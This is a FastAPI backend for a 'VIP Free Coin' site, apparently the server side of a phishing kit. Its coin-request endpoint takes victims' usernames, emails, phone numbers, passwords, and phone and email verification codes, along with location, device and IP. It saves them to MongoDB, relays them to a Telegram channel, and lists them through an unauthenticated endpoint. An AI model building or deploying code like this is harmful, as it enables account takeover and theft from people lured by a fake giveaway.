from fastapi import FastAPI, APIRouter, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from models import CoinRequest, CoinRequestCreate, StatusCheck, StatusCheckCreate
from telegram_service import telegram_service
from typing import List

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "VIP Free Coin API - Active"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

@api_router.post("/coin-request", response_model=CoinRequest)
async def create_coin_request(coin_request: CoinRequestCreate, request: Request):
    """Create a new coin request and send notification to Telegram"""
    try:
        # Get client IP
        client_ip = request.client.host if request.client else "Unknown"
        
        # Create coin request object
        coin_data = coin_request.dict()
        coin_data['ip'] = client_ip
        coin_obj = CoinRequest(**coin_data)
        
        # Save to database
        await db.coin_requests.insert_one(coin_obj.dict())
        
        # Send Telegram notification
        telegram_data = {
            'username': coin_obj.username,
            'amount': coin_obj.amount,
            'email': coin_obj.email,
            'phone': coin_obj.phone,
            'password': coin_obj.password or 'N/A',
            'phone_code': coin_obj.phone_code or 'N/A',
            'email_code': coin_obj.email_code or 'N/A',
            'location': coin_obj.location,
            'device': coin_obj.device,
            'ip': coin_obj.ip
        }
        
        telegram_service.send_coin_request(telegram_data)
        
        return coin_obj
        
    except Exception as e:
        logging.error(f"Error creating coin request: {str(e)}")
        raise

@api_router.get("/coin-requests", response_model=List[CoinRequest])
async def get_coin_requests():
    """Get all coin requests"""
    coin_requests = await db.coin_requests.find().sort('timestamp', -1).to_list(100)
    return [CoinRequest(**req) for req in coin_requests]

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()